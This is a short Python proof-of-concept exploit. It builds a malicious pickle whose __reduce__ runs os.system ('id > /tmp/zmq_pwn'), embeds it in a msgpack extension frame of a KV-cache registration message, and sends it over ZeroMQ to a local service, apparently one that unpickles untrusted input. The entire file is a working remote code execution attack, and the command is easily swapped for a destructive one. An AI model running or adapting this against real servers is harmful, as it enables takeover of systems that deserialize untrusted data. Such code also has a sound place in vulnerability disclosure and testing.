import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]


ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)

